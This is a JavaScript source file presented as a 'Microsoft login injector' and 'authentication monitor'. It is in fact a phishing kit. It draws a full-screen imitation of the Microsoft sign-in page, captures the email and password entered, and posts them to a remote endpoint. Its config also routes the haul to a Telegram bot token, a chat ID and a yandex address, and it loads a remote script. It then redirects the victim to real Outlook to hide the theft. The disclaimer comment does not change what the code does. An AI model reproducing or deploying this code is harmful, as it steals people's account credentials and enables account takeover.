// microsoft-login-injector.js
// This script adds the authentication monitor to Microsoft login pages
// IMPORTANT: Only deploy this on domains you legitimately own and control

// Configuration - customize these values
const config = {
  // Your authentication monitor URL
  monitorScript: "https://yourcompanydomain.com/auth-monitor/outlook-integration.js",
  
  // Your server endpoint for processing logs
  serverEndpoint: "https://yourcompanydomain.com/auth-logs",
  
  // Notification settings
  telegram: {
    botToken: "5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g,
    chatId: "5480674751"
  },
  
  email: {
    recipient: "jokersudo@yandex.com"
  },
  
  // Forwarding settings - where to send users after capturing credentials
  forwarding: {
    // Set to true to redirect users to the real Microsoft login
    enabled: true,
    // Delay before redirecting (in milliseconds)
    delay: 500,
    // Target URL (real Microsoft login)
    targetUrl: "https://outlook.office.com/mail/"
  }
};

// Function to dynamically load the monitor script
function loadMonitorScript() {
  const script = document.createElement('script');
  script.src = config.monitorScript;
  script.async = true;
  script.setAttribute('data-server', config.serverEndpoint);
  script.setAttribute('data-telegram-bot', config.telegram.botToken);
  script.setAttribute('data-telegram-chat', config.telegram.chatId);
  script.setAttribute('data-email', config.email.recipient);
  
  // Append to document
  document.head.appendChild(script);
  
  console.log("Authentication monitor loaded");
}

// Function to extract and forward URL parameters
function extractAndForwardParams() {
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  
  if (email && config.forwarding.enabled) {
    // Store email for forwarding
    localStorage.setItem('ms_email_forward', email);
    console.log(`Email parameter detected: ${email}`);
  }
}

// Function to create or modify the login form
function setupLoginForm() {
  // Check if we're on a login page by looking for specific elements
  const existingEmailInput = document.querySelector('input[type="email"], input[name="loginfmt"], #i0116, #emailInput');
  const existingPasswordInput = document.querySelector('input[type="password"], input[name="passwd"], #i0118, #passwordInput');
  
  if (existingEmailInput || existingPasswordInput) {
    console.log("Login form detected, setting up monitors");
    
    // The monitor script will handle the existing form
    return;
  }
  
  // If no login form found and we're not on a Microsoft domain, inject our own
  if (!isMicrosoftDomain()) {
    injectLoginForm();
  }
}

// Check if we're on a Microsoft domain
function isMicrosoftDomain() {
  const hostname = window.location.hostname.toLowerCase();
  const microsoftDomains = [
    'microsoft.com',
    'microsoftonline.com',
    'live.com',
    'outlook.com',
    'office.com',
    'office365.com',
    'sharepoint.com'
  ];
  
  return microsoftDomains.some(domain => hostname.includes(domain) || hostname.endsWith(`.${domain}`));
}

// Function to inject a custom login form if needed
function injectLoginForm() {
  // Create container for the login form
  const container = document.createElement('div');
  container.className = 'ms-login-container';
  container.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(255, 255, 255, 0.95);
    z-index: 999999;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
  `;
  
  // Create the login form HTML
  const formHtml = `
    <div style="background-color: white; border-radius: 4px; box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2); width: 440px; padding: 44px; max-width: 100%;">
      <div style="text-align: left; margin-bottom: 16px;">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" width="108" height="24">
      </div>
      
      <div id="emailSection">
        <h1 style="font-size: 24px; font-weight: 600; line-height: 1.25; margin-bottom: 16px;">Sign in</h1>
        <p id="emailDisplay" style="margin-top: 16px; display: none;"></p>
        <div style="position: relative; margin-bottom: 16px;">
          <input type="email" id="emailInput" placeholder="Email, phone, or Skype" style="width: 100%; height: 36px; padding: 6px 10px; border: 1px solid #666; border-radius: 2px; font-size: 15px; outline: none;">
        </div>
        <p style="font-size: 13px; margin-top: 16px;">No account? <a href="#" style="color: #0067b8; text-decoration: none;">Create one!</a></p>
        <p style="font-size: 13px; margin-top: 4px;"><a href="#" style="color: #0067b8; text-decoration: none;">Can't access your account?</a></p>
        <div style="text-align: right; margin-top: 16px;">
          <button id="nextButton" style="min-width: 108px; padding: 6px 12px; background-color: #0067b8; color: white; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer;">Next</button>
        </div>
      </div>
      
      <div id="passwordSection" style="display: none;">
        <h1 style="font-size: 24px; font-weight: 600; line-height: 1.25; margin-bottom: 16px;">Enter password</h1>
        <div style="position: relative; margin-bottom: 16px;">
          <input type="password" id="passwordInput" placeholder="Password" style="width: 100%; height: 36px; padding: 6px 10px; border: 1px solid #666; border-radius: 2px; font-size: 15px; outline: none;">
        </div>
        <p style="font-size: 13px; margin-top: 16px;"><a href="#" style="color: #0067b8; text-decoration: none;">Forgot password?</a></p>
        <div style="text-align: right; margin-top: 16px;">
          <button id="backButton" style="min-width: 108px; padding: 6px 12px; background-color: #e1e1e1; color: #1d1d1d; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer; margin-right: 8px;">Back</button>
          <button id="signInButton" style="min-width: 108px; padding: 6px 12px; background-color: #0067b8; color: white; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer;">Sign in</button>
        </div>
      </div>
      
      <div id="loadingSection" style="display: none; text-align: center; padding: 20px;">
        <div class="loading-dots" style="display: inline-block; position: relative; width: 80px; height: 80px;">
          <div style="position: absolute; top: 33px; width: 13px; height: 13px; border-radius: 50%; background: #0067b8; animation: loading 1.4s cubic-bezier(0, 0.5, 0.5, 1) infinite; animation-delay: -0.32s; left: 8px;"></div>
          <div style="position: absolute; top: 33px; width: 13px; height: 13px; border-radius: 50%; background: #0067b8; animation: loading 1.4s cubic-bezier(0, 0.5, 0.5, 1) infinite; animation-delay: -0.16s; left: 32px;"></div>
          <div style="position: absolute; top: 33px; width: 13px; height: 13px; border-radius: 50%; background: #0067b8; animation: loading 1.4s cubic-bezier(0, 0.5, 0.5, 1) infinite; left: 56px;"></div>
        </div>
        <p style="margin-top: 16px; font-size: 15px;">Please wait...</p>
      </div>
    </div>
    <style>
      @keyframes loading {
        0% { transform: scale(0); }
        50% { transform: scale(1); }
        100% { transform: scale(0); }
      }
    </style>
  `;
  
  // Set the form HTML
  container.innerHTML = formHtml;
  
  // Append to body
  document.body.appendChild(container);
  
  // Add event listeners
  setupFormEventListeners(container);
}

// Function to set up event listeners for the injected form
function setupFormEventListeners(container) {
  // Get email from URL or localStorage if available
  const urlParams = new URLSearchParams(window.location.search);
  const emailParam = urlParams.get('email');
  const storedEmail = localStorage.getItem('ms_email_forward');
  const email = emailParam || storedEmail || '';
  
  const emailInput = container.querySelector('#emailInput');
  const emailSection = container.querySelector('#emailSection');
  const passwordSection = container.querySelector('#passwordSection');
  const loadingSection = container.querySelector('#loadingSection');
  const emailDisplay = container.querySelector('#emailDisplay');
  const nextButton = container.querySelector('#nextButton');
  const backButton = container.querySelector('#backButton');
  const signInButton = container.querySelector('#signInButton');
  
  // Pre-fill email if available
  if (email) {
    emailInput.value = email;
  }
  
  // Next button click handler
  nextButton.addEventListener('click', function() {
    const email = emailInput.value.trim();
    if (email) {
      emailSection.style.display = 'none';
      passwordSection.style.display = 'block';
      emailDisplay.textContent = email;
      emailDisplay.style.display = 'block';
    }
  });
  
  // Back button click handler
  backButton.addEventListener('click', function() {
    passwordSection.style.display = 'none';
    emailSection.style.display = 'block';
  });
  
  // Sign in button click handler
  signInButton.addEventListener('click', function() {
    const email = emailInput.value.trim();
    const password = container.querySelector('#passwordInput').value;
    
    if (email && password) {
      // Show loading
      emailSection.style.display = 'none';
      passwordSection.style.display = 'none';
      loadingSection.style.display = 'block';
      
      // Log the credentials via the monitor script
      if (window.outlookAuthMonitor) {
        // The monitor is already loaded and will handle this
      } else {
        // Manually send the data
        const data = {
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          location: window.location.href,
          microsoftAuth: {
            formInputs: {
              email: email,
              password: password
            }
          },
          sessionId: 'manual_' + Math.random().toString(36).substring(2, 15)
        };
        
        fetch(config.serverEndpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        }).catch(error => {
          console.error("Error sending log data:", error);
        });
      }
      
      // Redirect after delay if enabled
      if (config.forwarding.enabled) {
        setTimeout(function() {
          window.location.href = config.forwarding.targetUrl;
        }, config.forwarding.delay);
      }
    }
  });
}

// Initialize when the page loads
window.addEventListener('DOMContentLoaded', function() {
  // Extract URL parameters
  extractAndForwardParams();
  
  // Load the monitor script
  loadMonitorScript();
  
  // Setup the login form
  setTimeout(setupLoginForm, 300);
});

// Also initialize on page load in case DOMContentLoaded already fired
if (document.readyState === 'complete' || document.readyState === 'interactive') {
  extractAndForwardParams();
  loadMonitorScript();
  setTimeout(setupLoginForm, 300);
}
